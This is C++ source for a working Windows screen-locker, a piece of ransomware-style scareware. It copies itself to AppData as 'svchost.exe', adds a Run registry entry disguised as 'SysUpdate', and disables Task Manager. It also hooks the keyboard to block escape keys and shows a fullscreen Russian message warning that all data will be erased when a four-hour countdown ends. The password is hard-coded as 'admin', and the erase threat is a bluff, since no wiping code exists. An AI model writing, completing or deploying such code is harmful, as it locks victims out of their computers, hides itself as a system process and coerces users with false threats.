// language: C++, file: locker.cpp, target: Windows 10/11 x64, MSVC 2022
// Build: cl /std:c++17 /EHsc /O2 locker.cpp user32.lib gdi32.lib advapi32.lib shell32.lib bcrypt.lib
// Purpose: fullscreen locker with 4-hour timer, keyboard hook, persistence, SHA-256 password.

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <bcrypt.h>
#include <string>
#include <vector>
#include <cstdio>

#pragma comment(lib, "bcrypt.lib")

// --- config: SHA-256 hash of the password ---
// Default password is "admin" (hash below). To change it, generate a new hash in PowerShell:
// $p='yourpass'; $b=[Text.Encoding]::UTF8.GetBytes($p); $h=[Security.Cryptography.SHA256]::Create().ComputeHash($b); ($h|%{$_.ToString('x2')}) -join ''
static const char* kHashHex = "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918";

static HHOOK   g_kbHook    = nullptr;
static HWND    g_hwnd      = nullptr;
static bool    g_locked    = true;
static std::wstring g_input;
static int     g_timeLeft  = 4 * 60 * 60; // 4 hours in seconds

// ---------- SHA-256 ----------
static std::string Sha256Hex(const std::string& in) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_HASH_HANDLE hHash = nullptr;
    DWORD cbData = 0, cbHash = 0, cbHashObj = 0;
    std::vector<BYTE> hashObj, hash;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, nullptr, 0);
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbHashObj, sizeof(DWORD), &cbData, 0);
    BCryptGetProperty(hAlg, BCRYPT_HASH_LENGTH,   (PUCHAR)&cbHash,   sizeof(DWORD), &cbData, 0);
    hashObj.resize(cbHashObj);
    hash.resize(cbHash);

    BCryptCreateHash(hAlg, &hHash, hashObj.data(), cbHashObj, nullptr, 0, 0);
    BCryptHashData(hHash, (PUCHAR)in.data(), (ULONG)in.size(), 0);
    BCryptFinishHash(hHash, hash.data(), cbHash, 0);

    BCryptDestroyHash(hHash);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    static const char* hex = "0123456789abcdef";
    std::string out;
    out.reserve(cbHash * 2);
    for (BYTE b : hash) { out.push_back(hex[b >> 4]); out.push_back(hex[b & 0xF]); }
    return out;
}

// ---------- persistence ----------
static void InstallPersistence() {
    wchar_t self[MAX_PATH]{};
    GetModuleFileNameW(nullptr, self, MAX_PATH);

    wchar_t appdata[MAX_PATH]{};
    GetEnvironmentVariableW(L"APPDATA", appdata, MAX_PATH);
    std::wstring dst = std::wstring(appdata) + L"\\svchost.exe";

    CopyFileW(self, dst.c_str(), FALSE);

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"SysUpdate", 0, REG_SZ,
            (const BYTE*)dst.c_str(), (DWORD)((dst.size()+1)*sizeof(wchar_t)));
        RegCloseKey(hKey);
    }

    // disable Task Manager
    if (RegCreateKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, nullptr, 0, KEY_SET_VALUE, nullptr, &hKey, nullptr) == ERROR_SUCCESS) {
        DWORD v = 1;
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
        RegCloseKey(hKey);
    }
}

// ---------- keyboard hook ----------
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && g_locked) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            // swallow system keys that escape the desktop
            if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN ||
                p->vkCode == VK_TAB  || p->vkCode == VK_ESCAPE ||
                p->vkCode == VK_F4   || p->vkCode == VK_MENU ||
                p->vkCode == VK_CONTROL || p->vkCode == VK_DELETE) {
                return 1;
            }
        }
    }
    return CallNextHookEx(g_kbHook, nCode, wParam, lParam);
}

// ---------- window proc ----------
static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
    switch (msg) {
    case WM_CREATE: {
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);
        SetWindowPos(h, HWND_TOPMOST, 0, 0, sw, sh, SWP_SHOWWINDOW);
        ShowCursor(FALSE);
        g_hwnd = h;
        
        // Force focus so typing works
        SetForegroundWindow(h);
        SetFocus(h);
        
        // Timer for 1 second ticks
        SetTimer(h, 1, 1000, nullptr);
        return 0;
    }
    case WM_TIMER: {
        if (w == 1 && g_locked && g_timeLeft > 0) {
            g_timeLeft--;
            InvalidateRect(h, nullptr, TRUE);
        }
        return 0;
    }
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC dc = BeginPaint(h, &ps);
        RECT rc; GetClientRect(h, &rc);
        
        // Background
        HBRUSH bg = CreateSolidBrush(RGB(10, 10, 14));
        FillRect(dc, &rc, bg);
        DeleteObject(bg);
        
        SetBkMode(dc, TRANSPARENT);
        SetTextColor(dc, RGB(220, 220, 230));
        
        // Fonts
        HFONT fBig = CreateFontW(48, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Segoe UI");
        HFONT fMid = CreateFontW(24, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Segoe UI");
        
        // Draw Title
        SelectObject(dc, fBig);
        RECT rcTitle = rc; rcTitle.top = 100; rcTitle.bottom = 200;
        DrawTextW(dc, L"ВАШ WINDOWS ЗАБЛОКИРОВАН", -1, &rcTitle, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

        // Draw Warning
        SetTextColor(dc, RGB(200, 50, 50)); // Red
        SelectObject(dc, fMid);
        RECT rcWarn = rc; rcWarn.top = 250; rcWarn.bottom = 350;
        DrawTextW(dc, L"Если вы не введете пароль, все ваши данные будут стерты через:", -1, &rcWarn, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

        // Draw Timer
        SetTextColor(dc, RGB(220, 220, 230));
        SelectObject(dc, fBig);
        int hours = g_timeLeft / 3600;
        int minutes = (g_timeLeft % 3600) / 60;
        int seconds = g_timeLeft % 60;
        wchar_t timerBuf[64];
        swprintf_s(timerBuf, L"%02d:%02d:%02d", hours, minutes, seconds);
        
        RECT rcTimer = rc; rcTimer.top = 380; rcTimer.bottom = 480;
        DrawTextW(dc, timerBuf, -1, &rcTimer, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

        // Draw Input Field Label
        SelectObject(dc, fMid);
        SetTextColor(dc, RGB(150, 150, 160));
        RECT rcPrompt = rc; rcPrompt.top = 550; rcPrompt.bottom = 600;
        DrawTextW(dc, L"Введите пароль:", -1, &rcPrompt, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

        // Draw Stars
        SetTextColor(dc, RGB(220, 220, 230));
        std::wstring stars(g_input.size(), L'*');
        RECT rcStars = rc; rcStars.top = 600; rcStars.bottom = 650;
        DrawTextW(dc, stars.c_str(), -1, &rcStars, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        
        DeleteObject(fBig);
        DeleteObject(fMid);
        EndPaint(h, &ps);
        return 0;
    }
    case WM_CHAR: {
        if (w == VK_BACK && !g_input.empty()) g_input.pop_back();
        else if (w >= 32 && w < 127) g_input.push_back((wchar_t)w);
        InvalidateRect(h, nullptr, TRUE);
        return 0;
    }
    case WM_KEYDOWN: {
        if (w == VK_RETURN) {
            std::string ascii(g_input.begin(), g_input.end());
            std::string h2 = Sha256Hex(ascii);
            if (h2 == kHashHex) {
                g_locked = false;
                HKEY hk;
                if (RegOpenKeyExW(HKEY_CURRENT_USER,
                    L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                    0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
                    DWORD v = 0;
                    RegSetValueExW(hk, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
                    RegCloseKey(hk);
                }
                UnhookWindowsHookEx(g_kbHook);
                DestroyWindow(h);
                PostQuitMessage(0);
            } else {
                g_input.clear();
                InvalidateRect(h, nullptr, TRUE);
            }
        }
        return 0;
    }
    case WM_DESTROY:
        ShowCursor(TRUE);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(h, msg, w, l);
}

// ---------- entry ----------
int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int) {
    InstallPersistence();

    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInst, 0);

    WNDCLASSW wc{};
    wc.lpfnWndProc   = WndProc;
    wc.hInstance     = hInst;
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"LockerWnd";
    RegisterClassW(&wc);

    CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"LockerWnd", L"System", WS_POPUP,
        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        nullptr, nullptr, hInst, nullptr);

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    if (g_kbHook) UnhookWindowsHookEx(g_kbHook);
    return 0;
}
